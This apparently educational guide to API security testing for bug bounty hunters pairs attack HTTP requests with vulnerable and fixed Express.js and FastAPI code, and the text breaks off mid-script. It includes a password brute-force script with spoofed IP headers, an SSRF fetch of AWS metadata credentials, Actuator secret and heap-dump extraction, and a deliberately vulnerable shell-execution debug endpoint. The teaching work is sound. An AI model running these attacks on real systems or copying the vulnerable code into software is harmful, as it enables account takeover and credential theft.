# Advanced API Security Testing: Hidden Parameters, Mass Assignment, BFLA, BOPLA, and Beyond

## Meta

- **Title:** Advanced API Security Testing: Hidden Parameters, Mass Assignment, BFLA, BOPLA, and Beyond
- **Meta Description:** A deep technical guide to advanced API security testing covering hidden parameter discovery, mass assignment, broken function and object property level authorization, mobile API reverse engineering, debug endpoint exploitation, rate limiting bypasses, and API key abuse -- with real payloads, Burp Suite workflows, and vulnerable/fixed code in Express.js and FastAPI.
- **Slug:** advanced-api-security-testing-hidden-parameters-mass-assignment-bfla-bopla
- **Keywords:** API security testing, hidden parameter discovery, mass assignment vulnerability, BFLA, BOPLA, Arjun tool, Param Miner, Swagger exposure, debug endpoints, API versioning exploit, rate limiting bypass, API key leakage, Burp Suite API testing, Express.js security, FastAPI security, bug bounty API, OWASP API Top 10

---

## Introduction

APIs are the backbone of every modern application. Mobile apps, single-page applications, microservices, third-party integrations -- they all funnel through HTTP APIs. And yet, API security testing remains one of the most underexplored areas in bug bounty programs and penetration tests. Most hunters chase XSS and SQLi on web forms while the real attack surface -- the API layer -- sits wide open.

This guide covers the advanced techniques that separate a competent API tester from an elite one. We are not going over OWASP basics you already know. Instead, we are diving into hidden parameter discovery with Arjun and Param Miner, mass assignment exploitation that escalates privileges in a single request, Broken Function Level Authorization (BFLA) and Broken Object Property Level Authorization (BOPLA) attacks, mobile API reverse engineering, Swagger/OpenAPI specification exposure, debug endpoint exploitation, API versioning authorization gaps, rate limiting bypasses, and API key abuse.

Every technique includes real HTTP requests, real payloads, vulnerable code in Express.js and FastAPI, fixed code, Burp Suite workflows, and bug bounty reporting guidance.

---

## 1. Hidden Parameter Discovery

### The Attack Surface

Most APIs accept more parameters than what the frontend sends. Developers write backend code that reads `req.body.role` or `req.body.isAdmin` but never expose those fields in the UI. The parameters exist, silently waiting for someone to send them.

### Arjun: Automated Parameter Discovery

Arjun brute-forces parameter names against an endpoint and detects which ones cause a measurable difference in the response.

```bash
# Install Arjun
pip3 install arjun

# Discover hidden GET parameters
arjun -u https://api.target.com/v1/users/profile -m GET

# Discover hidden POST parameters (JSON body)
arjun -u https://api.target.com/v1/users/register -m POST --json

# Use a custom wordlist
arjun -u https://api.target.com/v1/users/register -m POST --json -w /opt/wordlists/params.txt

# Pipe through a proxy for Burp inspection
arjun -u https://api.target.com/v1/users/register -m POST --json --proxy http://127.0.0.1:8080
```

Arjun detects parameters by comparing response lengths, status codes, and reflection patterns. When it finds that adding `role=admin` to a registration body changes the response from 200 bytes to 245 bytes, it flags `role` as a valid parameter.

### Param Miner (Burp Suite Extension)

Param Miner operates inside Burp Suite and integrates directly into your testing workflow.

**Setup:**

1. Open Burp Suite, go to Extender > BApp Store.
2. Install "Param Miner."
3. Right-click any request in Proxy/Repeater and select "Guess params" > "Guess body params" or "Guess query params."

**Configuration for API testing:**

- Set the response comparison mode to "content length" for JSON APIs (reflection-based detection often fails on JSON).
- Add custom wordlists targeting common privilege fields: `role`, `isAdmin`, `is_admin`, `admin`, `privilege`, `group`, `tier`, `balance`, `credit`, `permissions`, `access_level`, `account_type`.
- Enable "Guess JSON params" mode for REST API bodies.

### Real HTTP Request: Hidden Parameter Discovery

```http
POST /api/v1/users/register HTTP/1.1
Host: api.target.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{
  "username": "hunter",
  "email": "hunter@test.com",
  "password": "SecurePass123!"
}
```

Now test with hidden parameters injected:

```http
POST /api/v1/users/register HTTP/1.1
Host: api.target.com
Content-Type: application/json

{
  "username": "hunter",
  "email": "hunter@test.com",
  "password": "SecurePass123!",
  "role": "admin",
  "isAdmin": true,
  "balance": 99999.99,
  "permissions": ["read", "write", "delete", "admin"],
  "account_type": "premium",
  "is_verified": true,
  "email_verified": true
}
```

If the response contains `"role": "admin"` or the account gains admin privileges, you have a mass assignment vulnerability.

---

## 2. Mass Assignment Vulnerabilities

### How It Works

Mass assignment occurs when an API blindly maps incoming JSON fields to internal data model fields without whitelisting allowed properties. The developer expects `{username, email, password}` but the backend ORM/ODM happily accepts and persists `{username, email, password, role, isAdmin, balance}`.

### Vulnerable Express.js Code

```javascript
// VULNERABLE: Mass assignment via Mongoose
const express = require('express');
const mongoose = require('mongoose');
const app = express();
app.use(express.json());

const userSchema = new mongoose.Schema({
  username: String,
  email: String,
  password: String,
  role: { type: String, default: 'user' },
  isAdmin: { type: Boolean, default: false },
  balance: { type: Number, default: 0 },
  is_verified: { type: Boolean, default: false }
});

const User = mongoose.model('User', userSchema);

// VULNERABLE: Directly spreading request body into the model
app.post('/api/v1/users/register', async (req, res) => {
  try {
    const user = new User(req.body); // <-- Mass assignment here
    await user.save();
    res.status(201).json({ message: 'User created', user });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// VULNERABLE: Update profile with full body spread
app.put('/api/v1/users/profile', authMiddleware, async (req, res) => {
  try {
    const user = await User.findByIdAndUpdate(
      req.userId,
      req.body, // <-- Mass assignment: attacker sends { "role": "admin" }
      { new: true }
    );
    res.json({ user });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});
```

### Fixed Express.js Code

```javascript
// SECURE: Explicit field whitelisting
const allowedRegistrationFields = ['username', 'email', 'password'];
const allowedProfileUpdateFields = ['username', 'email', 'avatar', 'bio'];

function pickFields(source, allowed) {
  const result = {};
  for (const field of allowed) {
    if (source[field] !== undefined) {
      result[field] = source[field];
    }
  }
  return result;
}

app.post('/api/v1/users/register', async (req, res) => {
  try {
    const safeData = pickFields(req.body, allowedRegistrationFields);
    // Explicitly set defaults for sensitive fields
    safeData.role = 'user';
    safeData.isAdmin = false;
    safeData.balance = 0;
    safeData.is_verified = false;

    const user = new User(safeData);
    await user.save();

    // Strip sensitive fields from response
    const { password, ...userResponse } = user.toObject();
    res.status(201).json({ message: 'User created', user: userResponse });
  } catch (err) {
    res.status(500).json({ error: 'Registration failed' });
  }
});

app.put('/api/v1/users/profile', authMiddleware, async (req, res) => {
  try {
    const safeData = pickFields(req.body, allowedProfileUpdateFields);
    const user = await User.findByIdAndUpdate(
      req.userId,
      { $set: safeData }, // Only set whitelisted fields
      { new: true, select: '-password -isAdmin -role' }
    );
    res.json({ user });
  } catch (err) {
    res.status(500).json({ error: 'Update failed' });
  }
});
```

### Vulnerable FastAPI Code

```python
# VULNERABLE: Mass assignment via Pydantic model with all fields exposed
from fastapi import FastAPI, Depends
from pydantic import BaseModel
from typing import Optional
import databases
import sqlalchemy

app = FastAPI()

DATABASE_URL = "postgresql://user:pass@localhost/appdb"
database = databases.Database(DATABASE_URL)

# VULNERABLE: This model accepts role and is_admin from user input
class UserCreate(BaseModel):
    username: str
    email: str
    password: str
    role: Optional[str] = "user"
    is_admin: Optional[bool] = False
    balance: Optional[float] = 0.0

@app.post("/api/v1/users/register")
async def register(user: UserCreate):
    query = """
        INSERT INTO users (username, email, password, role, is_admin, balance)
        VALUES (:username, :email, :password, :role, :is_admin, :balance)
        RETURNING id, username, email, role, is_admin, balance
    """
    # Attacker sends {"role": "admin", "is_admin": true, "balance": 99999}
    result = await database.fetch_one(query, values=user.dict())
    return {"user": dict(result)}
```

### Fixed FastAPI Code

```python
# SECURE: Separate models for input and internal representation
from fastapi import FastAPI, Depends, HTTPException
from pydantic import BaseModel, Field
from typing import Optional
import databases

app = FastAPI()
DATABASE_URL = "postgresql://user:pass@localhost/appdb"
database = databases.Database(DATABASE_URL)

# Input model: only fields the user is allowed to set
class UserCreateRequest(BaseModel):
    username: str = Field(..., min_length=3, max_length=50)
    email: str = Field(..., regex=r'^[\w\.-]+@[\w\.-]+\.\w+$')
    password: str = Field(..., min_length=12)

# Internal model: includes server-controlled fields
class UserCreateInternal(BaseModel):
    username: str
    email: str
    password_hash: str
    role: str = "user"
    is_admin: bool = False
    balance: float = 0.0

# Response model: controls what the client sees
class UserResponse(BaseModel):
    id: int
    username: str
    email: str

@app.post("/api/v1/users/register", response_model=UserResponse)
async def register(user_request: UserCreateRequest):
    password_hash = hash_password(user_request.password)

    internal = UserCreateInternal(
        username=user_request.username,
        email=user_request.email,
        password_hash=password_hash
        # role, is_admin, balance all use secure defaults
    )

    query = """
        INSERT INTO users (username, email, password_hash, role, is_admin, balance)
        VALUES (:username, :email, :password_hash, :role, :is_admin, :balance)
        RETURNING id, username, email
    """
    result = await database.fetch_one(query, values=internal.dict())
    return dict(result)
```

### Role Manipulation in Registration and Update Endpoints

Beyond basic mass assignment, role manipulation specifically targets privilege escalation. Here is the testing methodology:

**Step 1: Register a normal account and capture the full response.**

```http
POST /api/v1/users/register HTTP/1.1
Host: api.target.com
Content-Type: application/json

{
  "username": "testuser",
  "email": "test@test.com",
  "password": "TestPass123!"
}
```

Response:

```json
{
  "id": 1042,
  "username": "testuser",
  "email": "test@test.com",
  "role": "user",
  "created_at": "2026-04-02T10:30:00Z"
}
```

**Step 2: The response leaks the `role` field. Now register with role manipulation.**

```http
POST /api/v1/users/register HTTP/1.1
Host: api.target.com
Content-Type: application/json

{
  "username": "adminuser",
  "email": "admin@test.com",
  "password": "TestPass123!",
  "role": "admin"
}
```

**Step 3: If registration succeeds with `"role": "admin"`, try the update endpoint too.**

```http
PUT /api/v1/users/profile HTTP/1.1
Host: api.target.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{
  "role": "admin"
}
```

**Step 4: Try alternate field names if the obvious ones are blocked.**

```json
{"user_role": "admin"}
{"userRole": "admin"}
{"access_level": "administrator"}
{"group": "admins"}
{"tier": "enterprise"}
{"type": "staff"}
{"privilege": "superuser"}
{"permissions": "*"}
```

---

## 3. Mobile API Reverse Engineering

### Intercepting Mobile App Traffic

Mobile apps communicate with the same APIs as the web frontend, often with less security scrutiny. The backend trusts the mobile client to send only "allowed" data because the UI constrains the user. We remove that constraint.

### Setting Up Interception

**Android (rooted or emulator):**

```bash
# Install Frida to bypass SSL pinning
pip3 install frida-tools

# List running apps
frida-ps -Ua

# Bypass SSL pinning on target app
frida -U -l ssl-pinning-bypass.js com.target.app

# Alternative: use objection for rapid bypass
pip3 install objection
objection -g com.target.app explore
# Inside objection shell:
# android sslpinning disable
```

**Extract API endpoints from APK:**

```bash
# Decompile APK
apktool d target-app.apk -o decompiled/

# Search for API endpoints
grep -rn "api\." decompiled/ --include="*.smali" | grep -i "https\|http\|/api/"
grep -rn "api" decompiled/res/values/strings.xml

# Use jadx for more readable Java output
jadx target-app.apk -d jadx-output/
grep -rn "BASE_URL\|API_URL\|endpoint" jadx-output/ --include="*.java"

# Extract hardcoded API keys
grep -rn "api_key\|apikey\|api-key\|secret\|token" jadx-output/ --include="*.java"
```

**iOS:**

```bash
# Use Frida on jailbroken device
frida -U -l ios-ssl-bypass.js com.target.app

# Extract IPA and decompile
unzip target.ipa -d extracted/
class-dump extracted/Payload/Target.app/Target > headers.h
strings extracted/Payload/Target.app/Target | grep -i "api\|http\|key\|secret"
```

### What to Look For

Once you intercept mobile API traffic, you typically discover:

1. **Undocumented endpoints** not present in web app traffic.
2. **Weaker authentication** -- some mobile endpoints accept API keys instead of JWTs.
3. **Verbose error messages** with stack traces.
4. **Hidden parameters** that the mobile client sends internally (device_id, app_version, debug flags).
5. **Admin/internal endpoints** the mobile app checks but does not render UI for.

---

## 4. Swagger/OpenAPI Specification Exposure

### Discovery

Developers frequently leave API documentation endpoints exposed in production. These specifications enumerate every endpoint, parameter, authentication scheme, and data model.

```bash
# Common Swagger/OpenAPI paths to probe
curl -s https://api.target.com/swagger.json | jq '.paths | keys'
curl -s https://api.target.com/openapi.json | jq '.paths | keys'
curl -s https://api.target.com/swagger/v1/swagger.json | jq '.paths | keys'
curl -s https://api.target.com/api-docs | jq '.paths | keys'
curl -s https://api.target.com/v1/api-docs
curl -s https://api.target.com/v2/api-docs
curl -s https://api.target.com/docs
curl -s https://api.target.com/redoc
curl -s https://api.target.com/swagger-ui/
curl -s https://api.target.com/swagger-ui/index.html
curl -s https://api.target.com/api/swagger.json
curl -s https://api.target.com/api/openapi.yaml

# Spring Boot specific
curl -s https://api.target.com/v3/api-docs
curl -s https://api.target.com/swagger-resources

# FastAPI default
curl -s https://api.target.com/openapi.json
curl -s https://api.target.com/docs
curl -s https://api.target.com/redoc

# GraphQL introspection (bonus)
curl -s -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'
```

### Extracting Attack Surface from OpenAPI Spec

```bash
# Download the spec
curl -s https://api.target.com/openapi.json -o openapi.json

# Extract all endpoints
cat openapi.json | jq -r '.paths | to_entries[] | "\(.key) -> \(.value | keys[])"'

# Extract endpoints that require no authentication
cat openapi.json | jq -r '
  .paths | to_entries[] |
  .key as $path |
  .value | to_entries[] |
  select(.value.security == null or .value.security == []) |
  "\(.key | ascii_upcase) \($path)"
'

# Extract all parameter names for mass assignment testing
cat openapi.json | jq -r '
  .components.schemas | to_entries[] |
  "\(.key): \(.value.properties // {} | keys | join(", "))"
'
```

### Weaponizing the Spec

When you find a Swagger spec with an admin endpoint like `DELETE /api/v1/admin/users/{id}`, test it immediately:

```http
DELETE /api/v1/admin/users/1 HTTP/1.1
Host: api.target.com
Authorization: Bearer <regular_user_token>
```

Many APIs document admin endpoints in the spec but rely on the frontend to hide them. The backend may not enforce authorization at all.

---

## 5. Debug Endpoints Left in Production

### Common Debug Paths

```bash
# Health and monitoring
/health
/healthcheck
/status
/ping

# Spring Boot Actuator (Java)
/actuator
/actuator/env          # Environment variables, including secrets
/actuator/configprops  # Configuration properties
/actuator/heapdump     # JVM heap dump -- may contain credentials
/actuator/mappings     # All registered URL mappings
/actuator/beans        # All Spring beans
/actuator/trace        # Recent HTTP requests with headers
/actuator/logfile      # Application logs

# Debug and profiling
/debug
/debug/vars
/debug/pprof           # Go profiling
/debug/requests
/_debug
/__debug__

# Metrics and monitoring
/metrics
/prometheus
/grafana
/_monitoring

# Server info
/server-info
/phpinfo.php
/elmah.axd             # .NET error logging
/trace
/env
/.env
/config

# Common framework defaults
/console               # H2 database console
/admin
/adminer
/phpmyadmin
```

### Real Attack: Spring Boot Actuator Exploitation

```bash
# Step 1: Confirm actuator is exposed
curl -s https://api.target.com/actuator | jq '._links | keys'

# Step 2: Extract environment variables (often contains DB credentials, API keys)
curl -s https://api.target.com/actuator/env | jq '.propertySources[].properties | to_entries[] | select(.key | test("password|secret|key|token"; "i")) | "\(.key): \(.value.value)"'

# Step 3: Download heap dump for offline credential extraction
curl -s https://api.target.com/actuator/heapdump -o heapdump.hprof
# Analyze with Eclipse MAT or jhat
strings heapdump.hprof | grep -i "password\|secret\|api_key\|jdbc"

# Step 4: Extract registered URL mappings to find hidden endpoints
curl -s https://api.target.com/actuator/mappings | jq '.contexts[].mappings.dispatcherServlets[][] | .predicate'
```

### Express.js Debug Endpoint Mistake

```javascript
// VULNERABLE: Debug endpoint left in production
const express = require('express');
const app = express();

// Developer added this during debugging and forgot to remove
app.get('/debug/users', async (req, res) => {
  const users = await User.find({}).select('+password +apiKey +resetToken');
  res.json(users);
});

app.get('/debug/config', (req, res) => {
  res.json({
    db_url: process.env.DATABASE_URL,
    jwt_secret: process.env.JWT_SECRET,
    aws_key: process.env.AWS_ACCESS_KEY_ID,
    aws_secret: process.env.AWS_SECRET_ACCESS_KEY,
    stripe_key: process.env.STRIPE_SECRET_KEY
  });
});

// This should never exist in production
app.get('/debug/exec', (req, res) => {
  const { cmd } = req.query;
  const { execSync } = require('child_process');
  const output = execSync(cmd).toString();
  res.send(output);
});
```

**Prevention: Environment-gated debug routes.**

```javascript
// SECURE: Only register debug routes in development
if (process.env.NODE_ENV === 'development') {
  app.get('/debug/users', async (req, res) => { /* ... */ });
}

// Better: Never have debug routes at all. Use proper logging and APM tools.
```

---

## 6. Excessive Data Exposure in API Responses

### The Problem

APIs frequently return entire database objects instead of curated response payloads. The frontend displays only `name` and `email`, but the API sends `password_hash`, `ssn`, `internal_notes`, `api_key`, and `billing_info` along with it.

### Testing Methodology

**Step 1: Capture a normal API response.**

```http
GET /api/v1/users/me HTTP/1.1
Host: api.target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

**Step 2: Examine every field in the response.**

```json
{
  "id": 1042,
  "username": "testuser",
  "email": "test@test.com",
  "role": "user",
  "password_hash": "$2b$12$LJ3m4ys8Kqx...",
  "reset_token": "a8f3e2d1-4b5c-6789-abcd-ef0123456789",
  "api_key": "sk_live_XXXXXXXXXXXXXXXXXXXX",
  "ssn_last4": "1234",
  "internal_notes": "VIP customer, approved for $50k credit line",
  "created_at": "2026-01-15T10:30:00Z",
  "stripe_customer_id": "cus_N1234567890",
  "two_factor_secret": "JBSWY3DPEHPK3PXP"
}
```

Fields like `password_hash`, `reset_token`, `api_key`, `ssn_last4`, `internal_notes`, `stripe_customer_id`, and `two_factor_secret` should never appear in a user-facing API response.

**Step 3: Check list endpoints -- they often leak even more.**

```http
GET /api/v1/users?page=1&limit=100 HTTP/1.1
Host: api.target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

List endpoints that return all users (or even a paginated subset) with full objects are a goldmine for data exposure.

### Vulnerable FastAPI Code

```python
# VULNERABLE: Returns full SQLAlchemy model with all columns
from fastapi import FastAPI
from sqlalchemy.orm import Session

@app.get("/api/v1/users/me")
async def get_profile(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    # Returns EVERYTHING -- password_hash, api_key, internal_notes, etc.
    return current_user.__dict__
```

### Fixed FastAPI Code

```python
# SECURE: Explicit response model strips sensitive fields
from pydantic import BaseModel

class UserProfileResponse(BaseModel):
    id: int
    username: str
    email: str
    avatar: str | None = None
    bio: str | None = None
    created_at: datetime

    class Config:
        from_attributes = True

@app.get("/api/v1/users/me", response_model=UserProfileResponse)
async def get_profile(current_user: User = Depends(get_current_user)):
    return current_user  # Pydantic strips fields not in UserProfileResponse
```

---

## 7. API Versioning Authorization Gaps

### The Attack

When teams ship API v2, they often implement stricter authorization. But v1 remains active for backward compatibility -- and retains its original, weaker authorization.

### Real Exploitation Flow

```http
# v2 enforces admin-only access -- returns 403
DELETE /api/v2/users/1042 HTTP/1.1
Host: api.target.com
Authorization: Bearer <regular_user_token>

HTTP/1.1 403 Forbidden
{"error": "Admin access required"}
```

```http
# v1 of the same endpoint has no authorization check -- returns 200
DELETE /api/v1/users/1042 HTTP/1.1
Host: api.target.com
Authorization: Bearer <regular_user_token>

HTTP/1.1 200 OK
{"message": "User deleted"}
```

### Testing Methodology

```bash
# If the app uses /api/v2/, systematically test /api/v1/
# Replace version numbers in every endpoint you find

# Automate version fuzzing
for version in v0 v1 v2 v3 v4 beta alpha internal staging dev; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/api/${version}/admin/users")
  echo "${version}: ${STATUS}"
done
```

### Common Version Patterns to Test

```
/api/v1/       -> /api/v2/       (and vice versa)
/api/v2/       -> /api/v1/       (downgrade attack)
/v1/           -> /v2/
/api/          -> /api/beta/
/api/          -> /api/internal/
/api/          -> /api/staging/
/api/v1/       -> /api/          (no version -- may hit a default route)
```

---

## 8. Broken Function Level Authorization (BFLA)

### Definition

BFLA occurs when a regular user can invoke API functions intended for a different role -- typically admin functions. The endpoint exists, the route is registered, but no authorization middleware checks whether the requesting user has the required role.

### Real Attack Scenario

A regular user discovers admin endpoints through Swagger exposure, JavaScript source analysis, or predictable naming:

```http
# Admin endpoint: list all users
GET /api/v1/admin/users HTTP/1.1
Host: api.target.com
Authorization: Bearer <regular_user_token>

HTTP/1.1 200 OK
{
  "users": [
    {"id": 1, "email": "admin@corp.com", "role": "admin"},
    {"id": 2, "email": "user1@corp.com", "role": "user"},
    ...
  ]
}
```

```http
# Admin endpoint: change any user's role
PUT /api/v1/admin/users/2/role HTTP/1.1
Host: api.target.com
Authorization: Bearer <regular_user_token>
Content-Type: application/json

{
  "role": "admin"
}

HTTP/1.1 200 OK
{"message": "Role updated", "user": {"id": 2, "role": "admin"}}
```

### Vulnerable Express.js Code

```javascript
// VULNERABLE: No role check on admin routes
const express = require('express');
const router = express.Router();

// Authentication middleware (only checks if token is valid, not the role)
const authMiddleware = require('../middleware/auth');

// These admin routes only require authentication, not authorization
router.get('/admin/users', authMiddleware, async (req, res) => {
  const users = await User.find({});
  res.json({ users });
});

router.delete('/admin/users/:id', authMiddleware, async (req, res) => {
  await User.findByIdAndDelete(req.params.id);
  res.json({ message: 'User deleted' });
});

router.put('/admin/users/:id/role', authMiddleware, async (req, res) => {
  const user = await User.findByIdAndUpdate(
    req.params.id,
    { role: req.body.role },
    { new: true }
  );
  res.json({ message: 'Role updated', user });
});

module.exports = router;
```

### Fixed Express.js Code

```javascript
// SECURE: Role-based authorization middleware
function requireRole(...roles) {
  return (req, res, next) => {
    if (!req.user || !roles.includes(req.user.role)) {
      return res.status(403).json({
        error: 'Forbidden',
        message: 'Insufficient permissions'
      });
    }
    next();
  };
}

// Apply both authentication AND authorization
router.get('/admin/users',
  authMiddleware,
  requireRole('admin'),
  async (req, res) => {
    const users = await User.find({}).select('-password -apiKey -resetToken');
    res.json({ users });
  }
);

router.delete('/admin/users/:id',
  authMiddleware,
  requireRole('admin'),
  async (req, res) => {
    // Prevent admin from deleting themselves
    if (req.params.id === req.user.id) {
      return res.status(400).json({ error: 'Cannot delete own account' });
    }

    // Audit log
    await AuditLog.create({
      action: 'DELETE_USER',
      target_user_id: req.params.id,
      performed_by: req.user.id,
      ip_address: req.ip,
      timestamp: new Date()
    });

    await User.findByIdAndDelete(req.params.id);
    res.json({ message: 'User deleted' });
  }
);
```

### BFLA Discovery Techniques

```bash
# 1. Check JavaScript bundles for API route definitions
curl -s https://target.com/static/js/app.js | grep -oP '"/api/[^"]*"' | sort -u

# 2. Check for admin paths in robots.txt or sitemap.xml
curl -s https://target.com/robots.txt
curl -s https://target.com/sitemap.xml

# 3. Brute-force admin endpoint paths
ffuf -u https://api.target.com/api/v1/FUZZ -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
  -mc 200,201,204,301,302 \
  -fc 404

# 4. Check HTTP method permutations
for METHOD in GET POST PUT PATCH DELETE OPTIONS; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X $METHOD \
    -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/api/v1/admin/users")
  echo "${METHOD}: ${STATUS}"
done
```

---

## 9. Broken Object Property Level Authorization (BOPLA)

### Definition

BOPLA (OWASP API3:2023) is the merger of excessive data exposure and mass assignment into a single category. It means a user can either read properties they should not see or write properties they should not modify.

### Read-Side BOPLA

A regular user fetches another user's profile and sees fields meant only for that user or for admins:

```http
GET /api/v1/users/1 HTTP/1.1
Host: api.target.com
Authorization: Bearer <different_user_token>

HTTP/1.1 200 OK
{
  "id": 1,
  "username": "admin",
  "email": "admin@corp.com",
  "phone": "+1-555-0100",
  "address": "123 Admin St, Secret City",
  "salary": 250000,
  "ssn": "123-45-6789",
  "role": "admin",
  "last_login_ip": "10.0.0.1",
  "two_factor_enabled": true,
  "api_key": "sk_admin_a8f3e2..."
}
```

### Write-Side BOPLA

A regular user modifies properties on their own profile that should be read-only or admin-only:

```http
PATCH /api/v1/users/me HTTP/1.1
Host: api.target.com
Authorization: Bearer <regular_user_token>
Content-Type: application/json

{
  "salary": 500000,
  "role": "admin",
  "is_verified": true,
  "credit_limit": 999999
}
```

### Comprehensive BOPLA Test Matrix

| Endpoint | Property | Expected Access | Test |
|---|---|---|---|
| GET /users/me | ssn | owner only | Request as different user |
| GET /users/me | api_key | owner only | Request as different user |
| GET /users/:id | salary | admin only | Request as regular user |
| PATCH /users/me | role | admin only | Try to set as regular user |
| PATCH /users/me | balance | system only | Try to set as regular user |
| PUT /orders/:id | total_price | system only | Try to modify as order owner |
| PATCH /users/me | is_verified | system only | Try to set as regular user |

---

## 10. Rate Limiting Bypass Techniques

### Common Bypasses

Rate limiting is often implemented poorly, with multiple bypass vectors:

**1. IP Rotation Headers**

```http
GET /api/v1/auth/login HTTP/1.1
Host: api.target.com
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
CF-Connecting-IP: 1.2.3.4
True-Client-IP: 1.2.3.4
X-Forwarded: 1.2.3.4
Forwarded: for=1.2.3.4
```

Rotate the IP on each request:

```python
import requests
import random

def random_ip():
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

for i in range(1000):
    ip = random_ip()
    headers = {
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "X-Originating-IP": ip
    }
    r = requests.post("https://api.target.com/api/v1/auth/login",
        json={"email": "victim@target.com", "password": f"attempt{i}"},
        headers=headers
    )
    print(f"Attempt {i}: {r.status_code}")
```

**2. API Version Downgrade**

```http
# Rate limited on v2
POST /api/v2/auth/login HTTP/1.1  -> 429 Too Many Requests

# Same logic, no rate limit on v1
POST /api/v1/auth/login HTTP/1.1  -> 200 OK
```

**3. HTTP Method Switching**

```http
# Rate limited on POST
POST /api/v1/auth/login -> 429

# Try PUT or PATCH -- some rate limiters only track specific methods
PUT /api/v1/auth/login -> 200
```

**4. Case and Encoding Tricks**

```
/api/v1/auth/login      -> rate limited
/Api/V1/Auth/Login      -> may bypass
/api/v1/auth/login/     -> trailing slash
/api/v1/auth/login?x=1  -> query parameter
/api/./v1/auth/login    -> path traversal normalization
/%61pi/v1/auth/login    -> URL encoding
```

**5. Null Byte or Unicode Injection**

```
/api/v1/auth/login%00
/api/v1/auth/login%0d%0a
```

**6. User-Agent Rotation**

Some rate limiters key on User-Agent:

```http
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) ...
User-Agent: curl/7.88.0
User-Agent: python-requests/2.31.0
```

---

## 11. API Key Leakage and Abuse

### Discovery Vectors

API keys leak through numerous channels. Here is a systematic approach to finding them:

```bash
# GitHub/GitLab search
# Search target org's public repos for key patterns
gh search code "AKIA" --owner target-org --language json
gh search code "api_key" --owner target-org --language env

# JavaScript source analysis
curl -s https://target.com/ | grep -oP 'src="[^"]*\.js"' | while read -r src; do
  url=$(echo "$src" | grep -oP '"[^"]*"' | tr -d '"')
  curl -s "https://target.com${url}" | grep -iP "(api[_-]?key|apikey|secret|token|authorization)\s*[:=]\s*['\"][^'\"]{10,}"
done

# .env file exposure
curl -s https://target.com/.env
curl -s https://api.target.com/.env
curl -s https://target.com/.env.production
curl -s https://target.com/.env.local

# AWS metadata (SSRF to metadata endpoint)
# If you find SSRF, use it to get IAM credentials:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Postman public collections
# Search https://www.postman.com/explore for target company name
# Developers often publish collections with live API keys
```

### AWS Key Exploitation

When you find AWS keys (starting with `AKIA`):

```bash
# Verify the key works
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# Enumerate permissions
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | awk -F/ '{print $NF}')

# Check S3 access
aws s3 ls

# Check EC2
aws ec2 describe-instances --region us-east-1

# Check Lambda
aws lambda list-functions --region us-east-1

# Use enumerate-iam for comprehensive permission enumeration
# https://github.com/andresriancho/enumerate-iam
python enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY
```

---

## 12. Burp Suite Workflow for API Testing

### Complete API Testing Methodology

**Phase 1: Reconnaissance**

1. Configure browser proxy to Burp (127.0.0.1:8080).
2. Browse the entire application. Every feature, every button, every form.
3. In Burp, go to Target > Site Map. Right-click the target domain and select "Engagement Tools" > "Find Scripts" to locate JavaScript files.
4. Use "Search" (Ctrl+F in HTTP History) to find all API endpoints.
5. Export discovered endpoints: Target > Site Map > right-click > "Copy URLs in this host."

**Phase 2: Import API Specification**

If you found an OpenAPI/Swagger spec:

1. Open Burp Dashboard.
2. New Scan > "Crawl" tab > import the OpenAPI JSON URL.
3. Alternatively, use the "OpenAPI Parser" extension from BApp Store.
4. This populates Burp's site map with every documented endpoint.

**Phase 3: Authentication Testing**

1. Create two user accounts: User A (regular) and User B (regular).
2. Use Burp's "Session Handling Rules" (Project Options > Sessions) to configure automatic token refresh.
3. Install the "Autorize" extension for automated authorization testing:
   - Set User A's token as the main session.
   - Set User B's token in the Autorize configuration.
   - Browse as User A; Autorize automatically replays every request with User B's token and compares responses.
   - Flag requests where User B gets the same 200 response (BOLA/IDOR).

**Phase 4: Parameter Testing**

1. Send every API request to Repeater.
2. For each request, run Param Miner (right-click > "Guess params").
3. Manually inject mass assignment payloads.
4. Test with and without authentication.
5. Test with different user tokens (horizontal privilege escalation).

**Phase 5: Automated Scanning**

1. Right-click target in Site Map > "Actively scan this host."
2. Configure scan profile for API testing (disable DOM-based checks, focus on server-side).
3. Review findings, validate manually in Repeater.

### Postman/Insomnia Testing Methodology

**Postman Approach:**

```
1. Import the OpenAPI spec (File > Import > paste URL or upload JSON).
2. Create environment variables:
   - base_url: https://api.target.com
   - admin_token: Bearer eyJ...
   - user_token: Bearer eyJ...
   - user2_token: Bearer eyJ...

3. Create test scripts for each request:
```

```javascript
// Postman test script: check for data leakage
pm.test("No sensitive data in response", function () {
    const body = pm.response.json();
    const sensitiveFields = [
        'password', 'password_hash', 'ssn', 'api_key',
        'secret', 'token', 'reset_token', 'two_factor_secret'
    ];

    function checkObject(obj, path = '') {
        for (const [key, value] of Object.entries(obj)) {
